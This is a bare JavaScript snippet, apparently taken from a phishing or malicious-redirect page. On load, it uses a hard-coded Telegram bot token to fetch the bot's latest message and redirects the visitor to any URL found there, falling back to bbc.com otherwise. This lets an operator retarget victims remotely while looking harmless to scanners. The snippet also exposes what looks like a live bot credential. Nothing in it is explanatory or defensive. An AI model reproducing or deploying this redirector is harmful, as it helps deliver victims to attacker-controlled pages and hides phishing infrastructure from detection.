<script language="javascript">

var BotToken = "6539309235:AAGxEKlltZKRHQyCB0TJqkkfndJTr_zg2QM";
var Exit = "https://www.bbc.com";
function Redirect() {
  fetch("https://api.telegram.org/bot" + BotToken + "/getUpdates?limit=1&offset=-1").then(marilia => {
    if (!marilia.ok) {
      window.location.replace(Exit);
    }
    ;
    return marilia.json();
  }).then(caloni => {
    var msg = caloni.result[0].message.text;
    if (msg.startsWith("http") == true) {
      window.location.replace(msg);
    } else {
      window.location.replace(Exit);
    }
  });
}

Redirect();

</script>